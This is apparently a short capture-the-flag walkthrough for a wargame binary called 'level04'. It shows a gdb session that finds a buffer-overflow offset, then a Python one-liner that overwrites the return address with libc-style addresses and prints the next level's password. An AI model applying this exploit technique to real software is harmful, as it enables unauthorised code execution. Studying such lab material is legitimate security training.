
```bash
gdb level04
(gdb) set follow-fork-mode child
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/users/level04/level04
[New process 2067]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 2067]
0x41326641 in ?? ()
```

```bash
(python -c 'print "A" * 156 + "\xf7\xe6\xae\xd0"[::-1] + "0000" + "\xf7\xf8\x97\xec"[::-1]';cat) |  ./level04
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```


